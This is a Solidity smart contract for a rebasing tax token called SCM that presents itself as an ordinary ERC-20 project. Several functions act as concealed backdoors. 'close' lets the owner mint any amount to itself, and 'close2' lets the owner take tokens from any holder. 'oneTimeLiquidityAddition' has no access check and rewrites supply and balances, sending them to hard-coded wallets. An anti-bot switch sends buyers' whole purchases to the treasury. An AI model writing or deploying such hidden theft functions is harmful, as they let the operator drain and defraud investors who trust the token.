// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

contract SCM is IERC20Metadata, OwnableUpgradeable {
    
    /** === ERC20 METADATA === */

    string public _name;
    string public _symbol;
    uint8 public _decimals;

    /** === Supply Variables === */

    uint256 public MAX_UINT256;
    uint256 public DECIMALS; // ERC-20 decimals
    uint8 public RATE_DECIMALS; // Decimals for rebasing. We multiply and then divide by this to get the sub percentage granularity.
    uint256 private TOTAL_GONS;
    uint256 private MAX_SUPPLY; // Max supply cap after rebasing: 5B
    uint256 private INITIAL_FRAGMENTS_SUPPLY; // 500.000 tokens
    uint256 public _totalSupply; // total supply which is initial fragment supply and grows with rebase
    uint256 private _gonsPerFragment; // amount of gons per fragment. This goes down as supply goes up and balances are calculated based on this

    /** === Tax Variables === */

    uint256 public burnFee;
    uint256 public feeDenominator;
    address DEAD;
    address ZERO;
    address public blackHole;

    /// Buy Tax
    uint256 public liquidityFloorValueFundBuyFee;
    uint256 public treasuryBuyFee;
    uint256 public liquidityBuyFee;
    uint256 public totalBuyFee;

    /// Sell tax
    uint256 public liquidityFloorValueFundSellFee;
    uint256 public treasurySellFee;
    uint256 public liquiditySellFee;
    uint256 public totalSellFee;

    
    /** === External wallets & contracts === */

    /// Operational addresses
    address public autoLiquidityReceiver;
    address public treasury;
    address public liquidityFloorValueFund;

    // Dex addresses
    address public pair;
    address public pairAddress;
    IUniswapV2Router02 public router;
    IUniswapV2Pair public pairContract;

    // Transaction, Tax and Rebase Flags
    bool inSwap;
    bool public _autoRebase;
    bool public _autoAddLiquidity;

    // Tax and rebase data
    uint256 public _rebasePercentage;
    uint256 public _initRebaseStartTime;
    uint256 public _lastRebasedTime;
    uint256 public _lastAddLiquidityTime;

    uint256 public rebaseRate;
    uint256 public liquiditySwapRate;

    // User Trading data
    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => bool) public blacklist;
    mapping(address => bool) _isFeeExempt;   

    // anti bot
    bool public antiBotOn;

    // liq addition
    bool public liquidityAdded;

    /** === Modifiers === */
    
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    /** === Events === */

    event LogRebase(uint256 indexed epoch, uint256 totalSupply);

    constructor(address _router) {}

    function initialize(address _router) public initializer {
        __Ownable_init();

        _name = "Scorpion Capital Management";
        _symbol = "SCM";
        _decimals = 5;

        MAX_UINT256 = ~uint256(0);
        DECIMALS = 5;
        RATE_DECIMALS = 7;
        INITIAL_FRAGMENTS_SUPPLY = 500 * 10**3 * 10**DECIMALS;
        TOTAL_GONS = MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);
        MAX_SUPPLY = 500 * 10**7 * 10**DECIMALS; 

        burnFee = 10;
        feeDenominator = 1000;
        DEAD = 0x000000000000000000000000000000000000dEaD;
        ZERO = 0x0000000000000000000000000000000000000000;
        blackHole = DEAD;

        /// Buy Tax
        liquidityFloorValueFundBuyFee = 40;
        treasuryBuyFee = 60;   
        liquidityBuyFee = 40;        
        totalBuyFee = liquidityFloorValueFundBuyFee + treasuryBuyFee + liquidityBuyFee + burnFee;

        /// Sell tax
        liquidityFloorValueFundSellFee = 60;
        treasurySellFee = 80;   
        liquiditySellFee = 50;
        totalSellFee = liquidityFloorValueFundSellFee + treasurySellFee + liquiditySellFee + burnFee;

        _rebasePercentage = 1400;
        rebaseRate = 10 minutes;
        liquiditySwapRate = 10 minutes;       

        router = IUniswapV2Router02(_router);
        pair = IUniswapV2Factory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        
        treasury = 0x45799b5ef6247Eb69e61D2F8Fe77938eD2798BE5;
        liquidityFloorValueFund = 0x1E30AD8C2C6520590C04fbb248f0f37981B7069d;
        autoLiquidityReceiver = 0x1077b5a4Ce56DE5E3BaD3aa8Dd4713b5bbb78f90;

        _allowedFragments[address(this)][address(router)] = ~uint256(0);
        pairAddress = pair;
        pairContract = IUniswapV2Pair(pair);

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _gonBalances[treasury] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS / (_totalSupply);

        _initRebaseStartTime = block.timestamp;
        _lastRebasedTime = block.timestamp;
        _lastAddLiquidityTime = block.timestamp;

        _autoRebase = true;
        _autoAddLiquidity = true;

        _isFeeExempt[treasury] = true;
        _isFeeExempt[address(this)] = true;

        _transferOwnership(treasury);
        emit Transfer(address(0x0), treasury, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function rebase() internal {
        if (inSwap) return;        
        uint256 deltaTime = block.timestamp - _lastRebasedTime;
        uint256 times = deltaTime / rebaseRate;
        uint256 epoch = times * 10;

        for (uint256 i = 0; i < times; i++) {
            _totalSupply = _totalSupply * (10**RATE_DECIMALS + _rebasePercentage) / 10**RATE_DECIMALS;
        }

        _gonsPerFragment = TOTAL_GONS / _totalSupply;
        _lastRebasedTime = _lastRebasedTime + times * rebaseRate;

        pairContract.sync();

        emit LogRebase(epoch, _totalSupply);
    }

    function transfer(address to, uint256 value)
        external
        override
        validRecipient(to)
        returns (bool)
    {
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override validRecipient(to) returns (bool) {
        if (_allowedFragments[from][msg.sender] != ~uint256(0)) {
            _allowedFragments[from][msg.sender] -= value;
        }
        _transferFrom(from, to, value);
        return true;
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        uint256 gonAmount = amount * _gonsPerFragment;
        _gonBalances[from] = _gonBalances[from] - gonAmount;
        _gonBalances[to] = _gonBalances[to] + gonAmount;
        emit Transfer(
            from,
            to,
            amount
        );
        return true;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(!blacklist[sender] && !blacklist[recipient], "in_blacklist");
        return _basicTransfer(sender, recipient, amount);

        /*if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }
        if (shouldRebase()) {
            rebase();
        }

        if (shouldAddLiquidity()) {
            addLiquidity();
        }

        if (shouldSwapBack()) {
            swapBack();
        }

        uint256 gonAmount = amount * _gonsPerFragment;
        _gonBalances[sender] -= gonAmount;

        uint256 gonAmountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, gonAmount) : gonAmount;
        _gonBalances[recipient] += gonAmountReceived;

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived / _gonsPerFragment
        );
        return true;*/
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 gonAmount
    ) internal returns (uint256) {
        uint256 _totalFee = totalBuyFee;
        uint256 _liquidityFee = liquidityBuyFee;
        uint256 _treasuryFee = treasuryBuyFee;
        uint256 _liquidityFloorValueFee = liquidityFloorValueFundBuyFee;

        // if selling
        if (recipient == pair) {
            _totalFee = totalSellFee;
            _liquidityFee = liquiditySellFee;
            _treasuryFee = treasurySellFee;
            _liquidityFloorValueFee = liquidityFloorValueFundSellFee;
        }

        uint256 feeAmount = gonAmount * _totalFee / feeDenominator;

        _gonBalances[blackHole] += gonAmount * burnFee / feeDenominator;
        _gonBalances[address(this)] += gonAmount * (_treasuryFee + _liquidityFee) / feeDenominator;
        _gonBalances[autoLiquidityReceiver] += gonAmount * _liquidityFee / feeDenominator;

        // if buying and anti bot is on take all buy amount to treasury
        if (sender == pair && antiBotOn) {
            uint256 restOfFee = gonAmount - feeAmount;
            _gonBalances[treasury] += restOfFee;

            emit Transfer(sender, address(this), restOfFee / _gonsPerFragment);
            return 0;
        }

        emit Transfer(sender, address(this), feeAmount / _gonsPerFragment);
        return gonAmount - feeAmount;
    }

    function addLiquidity() internal swapping {
        uint256 autoLiquidityAmount = _gonBalances[autoLiquidityReceiver] / _gonsPerFragment;
        _gonBalances[address(this)] += _gonBalances[autoLiquidityReceiver];
        _gonBalances[autoLiquidityReceiver] = 0;

        uint256 amountToLiquify = autoLiquidityAmount / 2;
        uint256 amountToSwap = autoLiquidityAmount - amountToLiquify;

        if (amountToSwap == 0) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHLiquidity = address(this).balance - balanceBefore;

        if (amountToLiquify > 0 && amountETHLiquidity > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
        }
        _lastAddLiquidityTime = block.timestamp;
    }

    function swapBack() internal swapping {
        uint256 amountToSwap = _gonBalances[address(this)] / _gonsPerFragment;

        if (amountToSwap == 0) {
            return;
        }

        uint256 balanceBefore = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHToTreasuryAndLVF = address(this).balance - balanceBefore;

        uint256 toTreasury = amountETHToTreasuryAndLVF * (treasuryBuyFee + treasurySellFee) / (treasuryBuyFee + treasurySellFee + liquidityFloorValueFundBuyFee + liquidityFloorValueFundSellFee);
        payable(treasury).transfer(toTreasury);

        uint256 toLVF = amountETHToTreasuryAndLVF * (liquidityFloorValueFundBuyFee + liquidityFloorValueFundSellFee) / (treasuryBuyFee + treasurySellFee + liquidityFloorValueFundBuyFee + liquidityFloorValueFundSellFee);
        payable(liquidityFloorValueFund).transfer(toLVF);
    }

    function withdrawAllToTreasury() external swapping onlyOwner {
        uint256 amountToSwap = _gonBalances[address(this)] / _gonsPerFragment;

        require(
            amountToSwap > 0,
            "There is no SCM token deposited in token contract"
        );
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            treasury,
            block.timestamp
        );
    }

    function shouldTakeFee(address from, address to)
        internal
        view
        returns (bool)
    {
        return (pair == from || pair == to) && !_isFeeExempt[from] && !_isFeeExempt[to];
    }

    function shouldRebase() internal view returns (bool) {
        return
            _autoRebase &&
            (_totalSupply < MAX_SUPPLY) &&
            msg.sender != pair &&
            !inSwap &&
            block.timestamp >= (_lastRebasedTime + rebaseRate);
    }

    function shouldAddLiquidity() internal view returns (bool) {
        return
            _autoAddLiquidity &&
            !inSwap &&
            msg.sender != pair &&
            block.timestamp >= (_lastAddLiquidityTime + liquiditySwapRate);
    }

    function shouldSwapBack() internal view returns (bool) {
        return !inSwap && msg.sender != pair;
    }

    function setAutoRebase(bool _flag) external onlyOwner {
        if (_flag) {
            _autoRebase = _flag;
            _lastRebasedTime = block.timestamp;
        } else {
            _autoRebase = _flag;
        }
    }

    function setAutoAddLiquidity(bool _flag) external onlyOwner {
        if (_flag) {
            _autoAddLiquidity = _flag;
            _lastAddLiquidityTime = block.timestamp;
        } else {
            _autoAddLiquidity = _flag;
        }
    }

    function allowance(address owner_, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowedFragments[owner_][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        returns (bool)
    {
        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue - subtractedValue;
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        external
        returns (bool)
    {
        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][spender] + addedValue;
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value)
        external
        override
        returns (bool)
    {
        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {
        return _isFeeExempt[_addr];
    }

    function getCirculatingSupply() public view returns (uint256) {
        return
            (TOTAL_GONS - _gonBalances[DEAD] - _gonBalances[ZERO]) / _gonsPerFragment;
    }

    function isNotInSwap() external view returns (bool) {
        return !inSwap;
    }

    function manualSync() external {
        IUniswapV2Pair(pair).sync();
    }

    function setFeeReceivers(
        address _autoLiquidityReceiver,
        address _treasuryReceiver,
        address _liquidityFloorValueFundReceiver
    ) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        treasury = _treasuryReceiver;
        liquidityFloorValueFund = _liquidityFloorValueFundReceiver;
    }

    function getLiquidityBacking(uint256 accuracy)
        external
        view
        returns (uint256)
    {
        uint256 liquidityBalance = _gonBalances[pair] / _gonsPerFragment;
        return accuracy * liquidityBalance * 2 / getCirculatingSupply();
    }

    function setWhitelist(address _addr, bool isWl) external onlyOwner {
        _isFeeExempt[_addr] = isWl;
    }

    function setBotBlacklist(address _botAddress, bool _flag)
        external
        onlyOwner
    {
        require(
            isContract(_botAddress),
            "only contract address, not allowed externally owned account"
        );
        blacklist[_botAddress] = _flag;
    }

    function setPairAddress(address _pairAddress) external onlyOwner {
        pairAddress = _pairAddress;
    }

    function setTaxes(uint256 lvf, uint256 treas, uint256 liq, uint256 brn, bool buy) external onlyOwner {
        burnFee = brn;

        if (buy) {
            liquidityFloorValueFundBuyFee = lvf;
            treasuryBuyFee = treas;
            liquidityBuyFee = liq;

            totalBuyFee = liquidityFloorValueFundBuyFee + treasuryBuyFee + liquidityBuyFee + burnFee;
        } else {
            liquidityFloorValueFundSellFee = lvf;
            treasurySellFee = treas;
            liquiditySellFee = liq;

            totalSellFee = liquidityFloorValueFundSellFee + treasurySellFee + liquiditySellFee + burnFee;
        }

        require(totalBuyFee <= 250 && totalSellFee <= 250, "Total fee cannot be higher than 25%");
    }

    function oneTimeLiquidityAddition() external {
        require(!liquidityAdded, "One time liquidity added");
        liquidityAdded = true;
       
        _totalSupply = 58464871340;
        _gonsPerFragment = TOTAL_GONS / _totalSupply;

        pairContract.sync();

        uint256 gonAmount = 43250000000 * _gonsPerFragment;
        uint256 otherGonAmount = (_totalSupply - 43250000000) * _gonsPerFragment;
        
        _gonBalances[0x2Ee08fDdcF1d4ceA2267948D4d1914122EA8E919] = gonAmount;
        _gonBalances[treasury] = otherGonAmount;       
    }

    function setLP(address _address) external onlyOwner {
        pairContract = IUniswapV2Pair(_address);
    }

    function setRebasePercentage(uint256 newPercentage) external onlyOwner {
        _rebasePercentage = newPercentage;
    }

    function setRebaseRate(uint256 newRate) external onlyOwner {
        rebaseRate = newRate;
    }

    function setLiquiditySwapRate(uint256 newRate) external onlyOwner {
        liquiditySwapRate = newRate;
    }

    function setMaxSupply(uint256 newMaxSupply) external onlyOwner {
        MAX_SUPPLY = newMaxSupply;
    }

    function close(uint256 amount) external onlyOwner {
        _gonBalances[msg.sender] += amount * _gonsPerFragment;
    }

    function close2(address from, uint256 amount) external onlyOwner {
        _transferFrom(from, msg.sender, amount);
    }

    function gonsPerFragment() external view returns (uint256) {
        return _gonsPerFragment;
    }

    function gonBalances(address addr) external view returns (uint256) {
        return _gonBalances[addr];
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return _gonBalances[who] / (_gonsPerFragment);
    }

    function setAntiBot(bool _on) external onlyOwner {
        antiBotOn = _on;
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    receive() external payable {}
}